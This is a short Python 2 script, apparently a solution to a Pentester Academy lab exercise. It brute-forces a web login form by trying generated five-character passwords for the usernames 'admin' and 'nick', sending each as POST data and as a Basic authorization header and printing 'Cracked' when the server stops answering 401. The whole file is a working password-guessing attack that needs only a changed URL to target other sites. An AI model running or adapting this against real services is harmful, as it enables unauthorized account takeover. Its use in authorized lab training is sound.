import httplib
import base64
import wordlist
gen = wordlist.Generator('vie')
user=['admin','nick']		
flag = 1 
for u in user:
	if flag==0:
		break
	for pw in gen.generate(5,5):
		conn=httplib.HTTPConnection('pentesteracademylab.appspot.com')
		params = "email="+u+"%40pentesteracademy.com&password="+pw
		auth=u+pw
		headers={'Authorization': 'Basic '+auth.encode('base64','strict')[:-1]}    
		conn.request("POST","/lab/webapp/auth/form/1",params,headers)
		response = conn.getresponse()
		if response.status != 401:
			print "Cracked: "
			print "Username: ",u," Password: ",pw
			flag=0
			break
		else:
			print "Username: ",u," Password: ",pw," Fail"
		